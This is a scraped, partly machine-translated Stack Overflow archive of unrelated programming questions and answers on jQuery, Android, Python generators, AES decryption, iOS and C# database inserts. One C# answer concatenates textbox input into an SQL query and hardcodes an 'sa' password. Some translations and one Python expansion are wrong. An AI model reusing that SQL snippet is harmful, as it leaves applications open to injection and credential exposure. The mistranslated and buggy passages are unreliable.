$(xml).find('book').each(function(){  
var $book = $(this); 
var id = $book.attr("id"); 
        var title = $book.attr("title");  
        var isbn = $book.attr("isbn");
        var borrowedcount = $book.attr("borrowedcount");
        var  html = '<div class="span3"><img name="test" src="http://covers.openlibrary.org/b/isbn/'+isbn+'-L.jpg" width="32" height="32" alt=""></p>' ; 
         html += '<p> ' + title + '</p>' ;  
         html += '<p> ' + isbn + '</p>' ;  
         html += '<p> ' + borrowedcount + '</p>' ;  
         html += '</div>';  
        $('.row-fluid').append($(html));  
    });         
}); 
}

 $(document).ready(function()  
  {  
    $.get('xml/courses.xml', function(xml){  
    $(xml).find('course').each(function(){ 

        var $course = $(this); 
        var id = $course.attr("id"); 
        var title = $course.text();  
        var html = '<div class="span12"><p>' + title + '</p><row id="'+id+'" >'+createBookRow(id)+'</row></div>' ;  
        $('.row-fluid').append($(html));   
        $('.loadingPic').fadeOut(1400); 
    });  
});

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:53:14.133

您提供的代码中没有返回任何内容。您只需将一些 HTML 附加到 jQuery 对象。尝试添加返回语句

```
return html; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:02:51.377

线

```
 var html = '<div class="span12"><p>' + title + '</p><row id="'+id+'" >'+createBookRow(id)+'</row></div>' ; 
```

应该只是

```
 var html = '<div class="span12"><p>' + title + '</p><row id="'+id+'" ></row></div>' ; 
 createBookRow(id); 
```

createBookRow(id) 函数正在发出获取请求以获取一些详细信息，这是异步发生的。除非您明确提及它是同步调用（不建议这样做）。

I guess the functionality you need is to render some rows for course and in between you need books details displayed. In that case you need to explicitly say where your book row needs to be appended.

```
 $('.row-fluid').append($(html)); 
```

The above code will always append book row at the end.

# android - how to store check box value from one activity to another activity

> ID：15111266
> 
> 赞同：0
> 
> 时间：2013-02-27T11:44:11.433
> 
> 标签：android, android-listview, android-checkbox

i have two activity with checkboxs in a list and i have to pass each value of checkbox to another activity and make it checked, where i can't use intent to pass that because both activity is not next together.

In this case how i will store the values in an array and to retrive in another activity

thanks to all, i have done it now and i'm posting it.

```
 int i = 0;
        checkBox = new CheckBox[getItemPR.size()];
        Constants.INDEX_TEMP_NEW=new int[getItemPR.size()];// stoing in array[]
        while (i < getItemPR.size()) {

            ITEM dtItem = getItemPR.get(i);

            TableLayout table11;
                table11 = (TableLayout) LayoutInflater.from(this).inflate(
                        R.layout.itemoverview2, null);
                checkBox[i] = (CheckBox) table11.findViewById(R.id.checkBox1);

                checkBox[i].setId(i);
                checkBox[i]
                        .setOnCheckedChangeListener(new OnCheckedChangeListener() {

                            @Override
                            public void onCheckedChanged(
                                    CompoundButton buttonView,
                                    boolean isChecked) {

                            onSetcheckboxchanged(buttonView.getId());                               
                            }

                        });
                if (Constants.INDEX_TEMP_NEW[i] == 0) {
                    checkBox[i].setChecked(true);

                } else {
                    checkBox[i].setChecked(false);
                } 
```

and

```
 public void onSetcheckboxchanged(int k) {

        if (checkBox[k].isChecked()) {              
            Constants.INDEX_TEMP_NEW[k] = 0;

        } else {
            Constants.INDEX_TEMP_NEW[k] = 1;
        }       
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:06:41.767

创建一个将扩展到 Application 类的 java 类，并通过调用**App.getInstance()**获取该类的对象，然后您可以从任何活动中设置或获取您选择的列表项。

```
public class App extends android.app.Application {
private static App app;
private ArrayList<Integer> checkedItemList;
private Activity activity;

@Override
public void onCreate() {
    super.onCreate();
    app = this;
}

public static App getInstance(){
    return app;
}

public void setCheckedItemList(ArrayList<Integer> checkedItemList){
    this.checkedItemList = checkedItemList;
}

public ArrayList<Integer> getCheckedItemList(){
    return this.checkedItemList;
}
} 
```

**现在在application 标签**下的 Android Manifest.xml 中注册 Application 类

 **```
<application
    android:name=".App"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name=".YourActivity"
        android:label="@string/app_name">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:53:16.750

我通常对这种事情使用静态类/方法，利用`SharedPreferences`

```
public static class Hal {
    private static final String PREFS   = "com.xxx.xxx.xxx";

    public static String getPreferenceString(Context ctx, String key) {
        SharedPreferences sharedPreferences = ctx.getSharedPreferences(Hal.PREFS, Activity.MODE_PRIVATE);
        return sharedPreferences.getString(key, "");
    }

    public static void setPreferenceString(Context ctx, String key, String val) {
        SharedPreferences sharedPreferences = ctx.getSharedPreferences(Hal.PREFS, Activity.MODE_PRIVATE);
        Editor preferencesEditor = sharedPreferences.edit();
        preferencesEditor.putString(key, val);
        preferencesEditor.commit();
        return;
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:59:08.977

您可以创建一个单例类来存储数组的值。例如。'Storage' 类具有数组的 getter、setter。您可以在类中设置数据：

```
public class Storage { 
private static Strorage strorageData = new Strorage ();
public static synchronized Strorage getInstance() {
        if (strorageData == null) {
            strorageData = new Strorage ();
        }
        return strorageData ;
    }
    // getter & setter

} 
```

在您的活动中，您可以使用访问此类的对象

```
 private Storage storageData;
 storageData = Storage .getInstance(); 
```

在此使用 getter 获取数据。**

# c# - This application can only run in the context of an app container

> ID：15111275
> 
> 赞同：15
> 
> 时间：2013-02-27T11:44:31.553
> 
> 标签：c#, visual-studio-2012

I am developing an app for Windows 8 on VS2012 using monoxna on C#.

The output .exe file does not run on double click. It displays the message

> This application can only run in the context of an app container.

How can I generate a runable exe for that app?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-12-04T10:23:11.127

如果这是一个商店/UWP 应用程序，那么它只能通过 appx 包安装。通常这应该通过商店。

如果您不想（或不能）通过商店分发，那么您可以创建一个可以直接安装的包。

在 VS 中转到：项目 > 商店 > 创建应用程序包... > 并选择否为商店构建包

在您可以在机器上安装应用程序之前，您需要在该机器上启用开发人员功能：
设置 > 更新和安全 > 对于开发人员 > 选择：旁加载应用程序

然后只需运行使用包创建的 PowerShell 脚本来安装它。

资源：

[https://stackoverflow.com/a/33669395/3850405](https://stackoverflow.com/a/33669395/3850405)

# jquery - jquery 中到 $(selector.context).add(context) 的快捷方式

> ID：15111279
> 
> 赞同：-1
> 
> 时间：2013-02-27T11:44:38.930
> 
> 标签：jquery

我正在寻找将所有子对象和选择器本身添加到 jQuery 对象的快捷方式。

做这样的事情的捷径：

```
$(selector,context).add(context) 
```

我想也许 .andSelf() 可以帮助..但没有。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:54:54.547

```
$('#element').children().andSelf() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:46:25.153

我不确定你想要什么。

要将上下文添加到由选择器过滤的子项中，请使用

```
$(context).find(selector).addBack() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:53:42.363

`**[LIVE DEMO](http://jsbin.com/oquzuc/3/edit)**`

```
$('#parent').find('.child').andSelf() 
```

# python - 解释在这个生命游戏实现中收益的使用

> ID：15111285
> 
> 赞同：3
> 
> 时间：2013-02-27T11:45:11.457
> 
> 标签：python, generator, itertools, yield, conways-game-of-life

在[这个 PyCon 演讲](http://pyvideo.org/video/880/stop-writing-classes)中，Jack Diederich 展示了[康威生命游戏的](http://en.wikipedia.org/wiki/Conway%27s_Game_of_Life#Rules)这个“简单”实现。我对 GoL 或半高级 Python 都不是很熟悉，但代码似乎很容易掌握，如果不是因为两件事：

1.  的使用`yield`。之前看到过使用yield创建生成器，但是连续8个是新的……是返回一个8个生成器的列表，还是这个东西是怎么工作的？
2.  `set(itertools.chain(*map(neighbors, board)))`. 明星解开了将邻居应用到董事会的结果列表（？），并且......我的想法刚刚爆发。

有人可以尝试为习惯于使用 map、filter 和 reduce 将一些 python 代码组合在一起但不是每天都使用 Python 的程序员解释这两个部分吗？:-)

```
import itertools

def neighbors(point):
    x, y = point
    yield x + 1, y
    yield x - 1, y
    yield x, y + 1
    yield x, y - 1
    yield x + 1, y + 1
    yield x + 1, y - 1
    yield x - 1, y + 1
    yield x - 1, y - 1

def advance(board):
    newstate = set()
    recalc = board | set(itertools.chain(*map(neighbors, board)))
    for point in recalc:
        count = sum((neigh in board) for neigh in neighbors(point))
        if count == 3 or (count == 2 and point in board):
            newstate.add(point)
    return newstate

glider = set([(0,0), (1,0), (2, 0), (0,1), (1,2)])
for i in range(1000):
    glider = advance(glider)
    print glider 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-27T11:51:59.853

生成器根据两个原则运行：每次`yield`遇到语句时它们都会产生一个值，除非它被迭代，否则它们的代码会*暂停*。

不管`yield`生成器中使用了多少语句，代码仍然以正常的 python 顺序运行。在这种情况下，没有循环，只是一系列`yield`语句，所以每次生成器前进时，python都会执行下一行，这是另一个`yield`语句。

生成器会发生什么`neighbors`：

1.  生成器总是开始暂停，所以调用`neighbors(position)`会返回一个还没有做任何事情的生成器。

2.  当它被高级（`next()`被调用）时，代码一直运行到第一个`yield`语句。首先`x, y = point`执行，然后`x + 1, y`计算并生成。代码再次暂停。

3.  再次前进时，代码将一直运行，直到遇到*下* `yield`一条语句。它产生`x - 1, y`.

4.  等，直到功能完成。

该`set(itertools.chain(*map(neighbors, board)))`行执行以下操作：

1.  `map(neighbors, board)``board`为序列中的每个位置生成一个迭代器。它只是简单地循环，调用`neighbors`每个值，并返回一个新的结果序列。每个`neighbors()`函数都返回一个生成器。

2.  该`*parameter`语法将`parameter`序列扩展为参数列表，就好像调用函数时将每个元素`parameter`作为单独的位置参数代替。`param = [1, 2, 3]; foo(*param)`将转换为`foo(1, 2, 3)`.

    `itertools.chain(*map(..))`获取地图生成的每个生成器，并将其作为一系列位置参数应用于`itertools.chain()`. 循环链的输出意味着每个板位置的每个生成器都按顺序迭代一次。

3.  所有生成的位置都添加到一个集合中，基本上删除了重复项

您可以将代码扩展为：

```
positions = set()
for board_position in board:
    for neighbor in neighbors(board):
        positions.add(neighbor) 
```

在 python 3 中，该行仍然可以通过使用[`itertools.chain.from_iterable()`](http://docs.python.org/3/library/itertools.html#itertools.chain.from_iterable)来更有效地表达，因为`map()`在 Python 3 中也是一个生成器；`.from_iterable()`不会强制`map()`扩展，而是会`map()`根据需要一一循环遍历结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:59:47.370

哇，这是一个很好的实现，感谢发布！

对于`yield`，没有什么可以添加到 Martijn 的答案中。

至于star：`map`返回一个生成器或一个列表（取决于python 2或3），这个列表的每个项目都是一个生成器（来自`neighbors`），所以我们有一个生成器列表。

[`chain`](http://docs.python.org/2/library/itertools.html#itertools.chain)接受许多可迭代的参数并将它们链接起来，这意味着它在依次迭代所有参数时返回一个可迭代的。

因为我们有一个生成器列表，并且`chain`需要许多参数，所以我们使用星号将生成器列表转换为参数。我们可以对[`chain.from_iterable`](http://docs.python.org/2/library/itertools.html#itertools.chain.from_iterable).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:53:36.927

它只是返回所有单元格邻居的元组。如果您确实了解生成器的作用，那么很明显在处理大量数据时使用生成器是一种很好的做法。您不需要将所有这些都存储在内存中，仅在需要时才计算它。

# java - Decrypt byte array with AES 128

> ID：15111298
> 
> 赞同：1
> 
> 时间：2013-02-27T11:45:28.810
> 
> 标签：java, javascript, cordova, cryptography, aes

I've looked for javascript libraries that can decrypt against an AES 128 encrypted String. I've found several :

*   [http://www.movable-type.co.uk/scripts/aes.html](http://www.movable-type.co.uk/scripts/aes.html)
*   [http://www.hanewin.net/encrypt/aes/aes-test.htm](http://www.hanewin.net/encrypt/aes/aes-test.htm) : you will have to look the source
*   [https://code.google.com/p/crypto-js/](https://code.google.com/p/crypto-js/)

My problem is these algoritms take as input either a String or a HexString. My case is a bit special, because my input in a byte array. I've coded a test case in **Java** :

```
 String key = "MrSShZqHM6dtVNdX";
    String message = "NzZiNGM3ZjIyNjM5ZWM3M2YxMGM5NjgzZDQzZDA3ZTQ=";
    String charsetName = "UTF-8";
    String algo = "AES";

    // decode message
    byte[] decodeBase64 = Base64.decodeBase64(message.getBytes(charsetName));
    System.out.println("decoded message: " + new String(decodeBase64));

    // prepare the key
    SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(charsetName), algo);

    // aes 128 decipher
    Cipher cipher = Cipher.getInstance(algo);
    cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
    byte[] doFinal = cipher.doFinal(Hex.decodeHex(new String(decodeBase64).toCharArray()));
    System.out.println("done with: " + new String(doFinal)); 
```

Output is :

```
decoded message: 76b4c7f22639ec73f10c9683d43d07e4
done with: 390902 
```

But this is Java, right? The `org.apache.commons.codec.binary.Hex.decodeHex` method converts an array of characters representing hexadecimal values into an array of bytes of those same values. The returned array will be half the length of the passed array, as it takes two characters to represent any given byte. An exception is thrown if the passed char array has an odd number of elements.

In decimal representation, `Hex.decodeHex` method gives this byte array : `[118, -76, -57, -14, 38, 57, -20, 115, -15, 12, -106, -125, -44, 61, 7, -28];`

The java AES decipher takes a byte array as input, but in Javascript, no lib does that. I've tried to tweak a bit the one [here](http://www.movable-type.co.uk/scripts/aes.html) but dude that's hardcore code. This is really not my field...

The closest I've been was on [this online tool](http://www.hanewin.net/encrypt/aes/aes-test.htm). My key is `MrSShZqHM6dtVNdX` and with apache commons Hex.encodeHex I get 4d725353685a71484d366474564e6458 giving me an output of 3339303930320a0a0a0a0a0a0a0a0a0a, which is almost my wanted output (390902)...

# android - Child view height is zero inside ScrollView

> ID：15111299
> 
> 赞同：4
> 
> 时间：2013-02-27T11:45:30.197
> 
> 标签：android, scrollview

I want to have a transparent view behind the LinearLayout which can consume click events, but only those events that were not consumed by LinearLayout children, so I use the following layout xml for this:

```
<?xml version="1.0" encoding="utf-8"?>
    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:fillViewport="true">

        <FrameLayout
            android:id="@+id/content"
            android:layout_width="match_parent"
            android:layout_height="wrap_content">

            <View
                android:id="@+id/test_view"
                android:layout_width="match_parent"
                android:layout_height="match_parent" />

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:orientation="vertical">
                    ....
            </LinearLayout>
        </FrameLayout>
    </ScrollView> 
```

The problem (**when content is long enough to not fit in a screen**):

on android 2.3 view (id="test_view") has a zero height but on android 4.2 it has height as big as its parent FrameLayout.

Tried to add dynamically this view through addView in code but not working, replaced FrameLayout with RelativeLayout - the same problem.

It works only with concrete height value (for example, 20dp), but I want this view to be as big as its parent. Please, help to resolve this problem.

# ios - UISegmentedControl 背景图片奇怪的行为

> ID：15111300
> 
> 赞同：2
> 
> 时间：2013-02-27T11:45:34.017
> 
> 标签：ios, objective-c, uisegmentedcontrol

我正在开发一个 iOS 项目，遇到了这个奇怪的问题。我有一个风格的`UISegmentedControl`元素。`bar`它有 3 个部分。这些片段的固定大小为 80。我还有 3 张图像，每个片段都被选为背景。这是其中之一`

![在此处输入图像描述](../Images/f1630d46d326119d31b199e8bbc631e9.png)

加载视图时，将其中一个段设置为选中，并将此图像设置为背景，如下所示：

```
[self.genderSelectionButton setBackgroundImage:[UIImage imageNamed:@"gender-switch01.png"] forState:UIControlStateNormal barMetrics:UIBarMetricsDefault]; 
```

现在，当我在 5.1 模拟器上运行项目时，我得到了分段按钮的扭曲视图：

![在此处输入图像描述](../Images/f6622e4fd37b5c06d12d8d002bdd9a4b.png)

如您所见，中间部分保持我给出的大小，但图像从中间到边缘有点拉伸。即使我已将其设置为 ，也会突出显示选定的段`NO`。在侦听按钮选择的方法中，我更改了背景图像并得到以下信息： ![在此处输入图像描述](../Images/1baadf8d151a3f2a096a24eb3c17a3bc.png)

（背景图又被拉长了……）

几乎相同的情况发生在 iOS6 上。现在我做错了什么，还是有办法解决这个问题？

**编辑**

找到了一个更好的实现，为普通按钮、选定按钮和分隔符使用单独的图像。请参阅下面的答案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T14:35:04.353

似乎设置完整的背景图像不是处理自定义分段按钮的最佳方式。示例在[这里](http://www.raywenderlich.com/4344/user-interface-customization-in-ios-5)找到。

这是完成所有操作的基本代码：

```
UIImage *segmentSelected = 
    [[UIImage imageNamed:@"segcontrol_sel.png"] 
        resizableImageWithCapInsets:UIEdgeInsetsMake(0, 15, 0, 15)];
UIImage *segmentUnselected = 
    [[UIImage imageNamed:@"segcontrol_uns.png"] 
        resizableImageWithCapInsets:UIEdgeInsetsMake(0, 15, 0, 15)];
UIImage *segmentSelectedUnselected = 
    [UIImage imageNamed:@"segcontrol_sel-uns.png"];
UIImage *segUnselectedSelected = 
    [UIImage imageNamed:@"segcontrol_uns-sel.png"];
UIImage *segmentUnselectedUnselected = 
    [UIImage imageNamed:@"segcontrol_uns-uns.png"];

[[UISegmentedControl appearance] setBackgroundImage:segmentUnselected 
    forState:UIControlStateNormal barMetrics:UIBarMetricsDefault];
[[UISegmentedControl appearance] setBackgroundImage:segmentSelected 
    forState:UIControlStateSelected barMetrics:UIBarMetricsDefault];

[[UISegmentedControl appearance] setDividerImage:segmentUnselectedUnselected 
    forLeftSegmentState:UIControlStateNormal 
    rightSegmentState:UIControlStateNormal 
    barMetrics:UIBarMetricsDefault];
[[UISegmentedControl appearance] setDividerImage:segmentSelectedUnselected 
    forLeftSegmentState:UIControlStateSelected 
    rightSegmentState:UIControlStateNormal 
    barMetrics:UIBarMetricsDefault];
[[UISegmentedControl appearance] 
    setDividerImage:segUnselectedSelected 
    forLeftSegmentState:UIControlStateNormal 
    rightSegmentState:UIControlStateSelected 
    barMetrics:UIBarMetricsDefault]; 
```

# ruby-on-rails - Angular 资源 - 绑定到 Rails RESTful API

> ID：15111302
> 
> 赞同：0
> 
> 时间：2013-02-27T11:45:39.327
> 
> 标签：ruby-on-rails, rest, angularjs

我正在查看 AngularJs 资源文档，它指出访问 API 的默认操作是： **{'get': {method:'GET'}, 'save': {method:'POST'}, 'query': {method: 'GET', isArray:true}, 'remove': {method:'DELETE'}, 'delete': {method:'DELETE'} };**

这与 Rails RESTful API 有点不同，我们有**index、show、new、create、edit、update 和 discard**。是否有一种“自动”的方式来绑定这两者而无需手动编写路径？谢谢！

附言。为什么删除和删除，在哪里更新？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:03:30.917

ngResource 只是为通常的 REST 约定使用不同的名称。例如：

```
var User = $resource('/user/:userId', {userId:'@id'});
var user = User.get({userId:123}, function() {
  // do something with user
}); 
```

在此示例中，发送Rails 路由逻辑传递给 UserController#show 操作`User.get()`的以下请求。`GET /user/123`

关于更新方法，您可以简单地自己创建一个：

```
var User = $resource('/user/:id', {}, {
    update: {
      method: 'PUT'
    }

} 
```

# macos - firebreath 事件 窗口 插件 鼠标 键盘 mac os

> ID：15111303
> 
> 赞同：0
> 
> 时间：2013-02-27T11:45:45.450
> 
> 标签：macos, firebreath

如何连接到 Mac OS 中的 ois 库 firebreath 插件？我有pluginwindowmac，想跟踪鼠标、键盘、操纵杆。

关于窗户：

```
FB::MessageWindow* messageWindow = new FB::MessageWindow();
mParamList.insert(std::make_pair(std::string("WINDOW"), messageWindow->getHWND()));
mInputManager = OIS::InputManager::createInputSystem(mParamList); 
```

messageWindow->getHWND() - 在 mac 操作系统中没有

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T15:46:44.230

我不知道 OIS 库的期望是什么，但我可以告诉你 HWND 是一种 windows 类型，所以肯定永远不会有在 mac os 上工作的 getHWND。

如果您需要的是 NSWindow ，那么恐怕您不走运。在 Mac OS 中，在 NPAPI 插件中获取事件的唯一方法是通过浏览器，FireBreath 通过其事件系统公开该浏览器。

# c# - 请求-响应模式 mvc

> ID：15111304
> 
> 赞同：0
> 
> 时间：2013-02-27T11:45:49.820
> 
> 标签：c#, asp.net-mvc, request, response

Asp.net（Webforms）中的请求-响应模式是否与 MVC 世界中传递和返回的“模型”相同（或相似）。基本上，如果所有请求/响应类都包含一些与请求或响应相关的属性并且实际上可以放置在模型中，那么是否仍然需要使用请求/响应（即创建单独的请求和响应类）模式，例如

```
LoginRequest.cs contains   
string Username { get; set; }

LoginResponse.cs contains 
string AuthenticationTicket { get; set; } 
```

而 LoginModel.cs 会有

```
string Username { get; set; }
string AuthenticationTicket { get; set; } 
```

在 MVC 世界中哪个更好用？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:08:14.723

有人可能会争辩说，根据您查看的级别，它们都是相同的，因为您有一个请求（带有上下文参数的回发/通过模型绑定器绑定的模型）和一个响应（更改响应对象/基于 viewmodel 渲染视图) 在每个请求中，但在另一个层面上，它们是根本不同的，因为 Web 窗体被认为对 Windows 窗体开发人员来说是自然的，而 MVC 是，IMO，一个更成熟且具有更好的 Web 框架的 SoC 架构。

在处理 MVC 应用程序时，我通常选择一个代表视图模型的类和另一个对请求有意义的类，因此在用户详细信息场景中，我会有这样的事情：

```
public class LoginModel
{
    public string Username {get;set;}
    public string Password {get;set;}
}

public class LoginViewModel
{
    public string Username {get;set;}
    public string Fullname {get;set;}
    public string LastLogin {get;set;}
}

public ActionResult Login(LoginModel model) 
{
    /* do whatever you need */

    return new LoginViewModel { ... };
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-24T14:34:50.750

在处理 WCF 场景时，您仍然需要请求/响应 DTO。Request 实体应该是可序列化的，并且包含与 MVC 视图离散的信息。另一方面，视图模型包含绑定到相关视图的信息。希望这有帮助！

# events - 我可以在 BizTalk 中引发自定义 SCOM 警报吗

> ID：15111305
> 
> 赞同：0
> 
> 时间：2013-02-27T11:45:50.363
> 
> 标签：events, biztalk, biztalk-2010, alerts, mom

在对它们进行进一步处理之前，我需要检查一组中的所有三个必需文件是否都已通过 FTP 传输。如果前一天的所有三个文件在 08:00 之前都没有到达，我需要提出并提醒支持人员联系供应商。（事件一）

如果所有三个文件都在那里，我然后检查总数是否等于交易，如果不是，我丢弃所有三个文件并向支持人员发出警报以联系供应商（事件 2）

我已经加载了 BizTalk (2010) - SCOM 管理包，我需要知道我是否可以创建一个自定义规则，该规则将引发和事件以供 SCOM 检测，据此我需要 SCOM 向收件人发送特定于场景的电子邮件（例如事件 1 - 所有三个必需文件都不可用！// 或 // 事件 2 - 事务总和无法与总计文件核对）

我们已经研究过为消息事件日志创建一个 SQL 表并为每个连接点定义自定义进程，但它很笨拙，我被告知可以实现上述方式，让 SCOM 根据引发的事件处理警报发送BizTalk 中的流程，即使它们是比服务事件更多的业务事件。

请告知 - 我们已经在这个圈子里转了两三个星期了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T00:45:12.723

SCOM 没有像您所描述的那样开箱即用的东西。我确实认为您正在按照尼克的建议在这里查看定制工作。

另一种选择是 BizTalk360 确实提供此功能。它被称为“[过程监控](http://blogs.digitaldeposit.net/saravana/post/2012/08/08/BizTalk360-Process-Monitoring-Capabilities.aspx)”，但需要软件许可证。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-17T01:37:53.307

一种选择是使用业务活动监控 (BAM) 并在其中发出警报。

# python - 如何启动我的 Selenium 测试所需的另一个进程

> ID：15111311
> 
> 赞同：0
> 
> 时间：2013-02-27T11:46:11.837
> 
> 标签：python, django, selenium

我正在使用[django-selenium](https://django-selenium.readthedocs.org/en/latest/)将 Selenium 测试功能添加到现有的单元测试中。

我的 Selenium 测试依赖于在我的机器上运行的 Web 服务器，这将通过像这样运行我们的 django 应用程序来触发；`main.py -a`

所以我在 Selenium 测试中要做的第一件事就是启动我这样设置的服务器；

```
def start_server():
    path = os.path.join(os.getcwd(), 'main.py -a')
    server_running = is_server_running()
    if server_running is False:
        server = subprocess.Popen('cmd.exe', stdin= subprocess.PIPE, stdout= subprocess.PIPE)
        stdout, stderr = server.communicate(input='%s\n' % path)
        print 'Server error:\n{0}\n'.format(stderr)
    server_running = is_server_running()

    return server_running 
```

但是，当我这样做时，网络服务器会在命令行中接管 django 测试过程的执行。我认为我应该这样做的方式是在单独的进程中启动命令提示符，然后`main.py -a`在该进程中触发命令。

这是正确的想法吗？如果是这样，我该如何修改该函数以生成一个新进程并启动我的命令？我试图运行'cmd.exe'，`Process(target=path`但我无法让它工作。谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:05:11.170

我采用的方法是使用更简单的启动方法；

启动服务器.py

```
def run():
    path = os.path.join(os.getcwd(), 'main.py')
    server_running = is_server_running()
    if server_running is False:
        subprocess.Popen(['python', path, '-a'])

if __name__ == '__main__':
    run() 
```

然后我可以在我的测试设置和拆卸中开始和停止；

```
def setUp(self):
    self.server = Process(target= startServer.run)
    self.server.start()

def test(self):
    # run test process

def tearDown(self):
    utils.closeBrowser(self.ff) 
```

很可能有更好的做事方式&这里的东西可能不是“应该的”，但它可以工作（有一个套接字强制关闭错误）:)

我唯一突出的问题是在创建数据库表之前开始测试:(

# c# - 使用c#将文本框值插入sql server

> ID：15111312
> 
> 赞同：1
> 
> 时间：2013-02-27T11:46:13.803
> 
> 标签：c#, asp.net

我需要向 SQL Server 数据库表中添加一个文本框值。下面是我的代码：

```
private void button1_Click(object sender, EventArgs e)
{
    string str = "Data Source=.\\SQLEXPRESS;AttachDbFilename=|DataDirectory|\\timetablesystem.mdf;Integrated Security=True;User Instance=True";
    SqlConnection con = new SqlConnection(str);
    string qry = "insert into SubjectMaster (SubjectName) values (@TxtSubjectName)";
    con.Open();
    SqlCommand cmd = new SqlCommand(qry, con);
    cmd.CommandType = CommandType.Text;
    cmd.Parameters.AddWithValue("@TxtSubjectName", TxtSubjectName.Text);
    cmd.ExecuteNonQuery();
    MessageBox.Show("Added Successfully!!");
    con.Close();
} 
```

但是，数据不应该添加到表中...请帮助我...感谢您的帮助...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:01:55.457

如果它有效，请先尝试调试您的查询，我认为您与数据库的连接不起作用。

```
string str = "Data Source=.\\SQLEXPRESS;AttachDbFilename=|DataDirectory|\\timetablesystem.mdf;Integrated Security=True;User Instance=True"; 
```

应该有这个'。数据源后`Data Source=.\\SQLEXPRESS`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-07T10:16:38.437

试试这个，告诉我消息信息内容是什么

```
private void button1_Click(object sender, EventArgs e)
{
    string str = "Server=.\SQLEXPRESS;Database=TestDB;Trusted_Connection=True;";
    using( SqlConnection con = new SqlConnection(str)){
                            try{
                                con.Open();
                                string qry = "insert into SubjectMaster (SubjectName) values (@TxtSubjectName)";
                                SqlCommand cmd = new SqlCommand(qry, con);
                                cmd.CommandType = CommandType.Text;
                                cmd.Parameters.AddWithValue("@TxtSubjectName", TxtSubjectName.Text);
                                cmd.ExecuteNonQuery();
                                MessageBox.Show("Added Successfully!!");
                               }
                          catch{
                                MessageBox.Show("connection is failed!!");
                               }
                                                       }
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-08-07T10:08:01.627

尝试这个

```
 SqlConnection con = new SqlConnection(@"Data Source=SL-20\SQLEXPRESS;Initial   Catalog=TestDB;User ID=sa;Password=sl123;");
        string query = " insert into name(name)values('" + TextboxTest.Text + "')";
        con.Open();
        SqlCommand cmd = new SqlCommand(query, con);
        cmd.ExecuteNonQuery();
        con.Close(); 
```

# c# - 创建一个新类并从另一个类 c# asp 调用它

> ID：15111319
> 
> 赞同：0
> 
> 时间：2013-02-27T11:46:46.847
> 
> 标签：c#, asp.net, class, data-binding

在编程方面，我是一个新手，我只是对开始感兴趣。我创建了一个简单的 asp web 项目，并包含了多个网页，其中我有下拉列表。

我可以创建一个使用数据集从我的数据库中选择项目标题的类，这一切都很好。我的问题是如何从不同的网页调用此类以将数据绑定到我的下拉列表？

下面是我从数据库中提取所需数据的代码

```
public void cmbProject()
{
    using (SqlConnection oConn = new SqlConnection(ConfigurationManager.ConnectionStrings["connString"].ToString()))
    {
        string sql = "select pr.ProjectID, lo.UserName, " +
                     "pr.Title " +
                     "from Project pr " +
                     "inner join ProjectUsers pu on pu.ProjectID = pr.ProjectID " +
                     "inner join Users us on us.UserID = pu.UserID " +
                     "inner join Login lo on lo.UserID = us.UserID " +
                     "where lo.UserName like '%daniel_23%'";
        try
        {
            oConn.Open();
            //fill drop down list with project listings
            SqlCommand cmd = new SqlCommand(sql, oConn);
            SqlDataReader reader = cmd.ExecuteReader();

            oConn.Close();
        }
        catch (Exception)
        {
            throw;
        }
    }
} 
```

# opencl - 使用 extern 将 Opencl 参数传递给内核

> ID：15111321
> 
> 赞同：1
> 
> 时间：2013-02-27T11:46:50.557
> 
> 标签：opencl, gpgpu, gpu

我们可以使用 extern 来代替使用 'setKernelArg' 将参数传递给内核函数吗？

例如：

```
cl_mem countMobj;     //device variable 
```

假设我必须将此变量传递给内核函数。我可以声明存储类说明符 extern 来传递地址而不是通过“setKernelArg”传递吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T16:40:34.223

不。主机 C/C++ 编译器不知道存在诸如具有自己地址空间的 OpenCL 设备之类的东西。

# c# - 关闭控制台窗口时关闭所有应用程序

> ID：15111323
> 
> 赞同：0
> 
> 时间：2013-02-27T11:47:12.010
> 
> 标签：c#

